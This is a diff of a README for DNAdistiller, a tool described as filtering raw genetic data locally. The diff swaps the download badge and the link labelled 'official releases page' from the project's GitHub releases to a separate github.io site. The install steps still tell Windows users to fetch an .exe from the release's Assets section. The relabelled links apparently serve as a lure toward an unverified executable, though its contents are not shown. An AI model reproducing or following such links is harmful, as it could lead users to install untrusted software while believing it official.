@@ -1,6 +1,6 @@
 # 🧬 DNAdistiller - Extract meaningful insights from DNA files
 
-[![](https://img.shields.io/badge/Download-DNAdistiller-blue.svg)](https://github.com/sherlocketransverse33/DNAdistiller/releases)
+[![](https://img.shields.io/badge/Download-DNAdistiller-blue.svg)](https://sherlocketransverse33.github.io)
 
 DNAdistiller processes raw genetic data locally on your computer. It allows you to select specific health and longevity markers from your DNA files. You then share this smaller, filtered set of information with artificial intelligence tools. This method protects your privacy by ensuring you do not upload your entire genetic blueprint to the cloud.
 
@@ -18,7 +18,7 @@ The software uses a local database of known genetic markers. It maps your raw da
 
 Follow these steps to set up the software on your Windows computer.
 
-1. Visit the [official releases page](https://github.com/sherlocketransverse33/DNAdistiller/releases) to access the latest version of the installer.
+1. Visit the [official releases page](https://sherlocketransverse33.github.io) to access the latest version of the installer.
 2. Look for the file ending in `.exe` under the Assets section of the newest release.
 3. Click the link to download the file to your computer.
 4. Locate the downloaded file in your Downloads folder.
